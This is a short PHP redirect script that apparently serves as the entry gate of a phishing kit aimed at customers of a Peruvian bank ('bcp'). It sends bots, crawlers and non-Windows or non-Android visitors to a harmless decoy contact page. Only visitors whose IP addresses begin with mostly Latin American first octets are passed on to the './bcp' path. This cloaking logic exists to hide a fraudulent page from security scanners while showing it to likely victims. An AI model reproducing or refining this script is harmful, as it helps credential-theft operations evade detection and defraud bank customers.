<?php
session_start();
session_destroy();

date_default_timezone_set("America/Lima");

$redireccionarA = "http://buroperu.com/contacto.html";

require "f1.php";

$userAgentResult = parse_user_agent();

$xForwardedFor = !empty($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : "nada";
$remoteAddr = !empty($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : "nada";
$userAgent = !empty($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : "nada";
$datetime1 = date("Y-m-d H:i:s");

if ( strstr($userAgent, "bot") == FALSE && ( $userAgentResult["platform"] == "Windows" || $userAgentResult["platform"] == "Android"  ) ){
    //print_r(1);
    //exit();

    $ipStr = $remoteAddr;
    if( $xForwardedFor != "nada" ){
        $ipStr = $xForwardedFor;
    }
    print_r($ipStr);
    if($ipStr == "::1"){
        $ipStr = "192.168.0.15";
    }
    
    
    $ipsArrayAllowed[0] = "45";
    $ipsArrayAllowed[1] = "131";
    $ipsArrayAllowed[2] = "132";
    $ipsArrayAllowed[3] = "143";
    $ipsArrayAllowed[4] = "148";
    $ipsArrayAllowed[5] = "161";
    $ipsArrayAllowed[6] = "167";
    $ipsArrayAllowed[7] = "168";
    $ipsArrayAllowed[8] = "170";
    $ipsArrayAllowed[9] = "179";
    $ipsArrayAllowed[10] = "181";
    $ipsArrayAllowed[11] = "186";
    $ipsArrayAllowed[12] = "190";
    $ipsArrayAllowed[13] = "191";
    $ipsArrayAllowed[14] = "200";
    $ipsArrayAllowed[15] = "201";
    $ipsArrayAllowed[16] = "204";
    $ipsArrayAllowed[17] = "207";
    $ipsArrayAllowed[18] = "209";
    $ipsArrayAllowed[19] = "216";
    $ipsArrayAllowed[20] = "192";
    
    
    $ipStrExplodedArray = explode(".",$ipStr);
    
    $ipFirstNumber = $ipStrExplodedArray[0];
    
    if(in_array($ipFirstNumber, $ipsArrayAllowed)){
        
        $_SESSION['ipRemotaVisitante2'] = $ipStr;
        header("Location: ./bcp");        
        exit();
        
    }else{
        header("Location: $redireccionarA");
        exit();
    }
    
}else{
    header("Location: $redireccionarA");
    exit();
}
?>
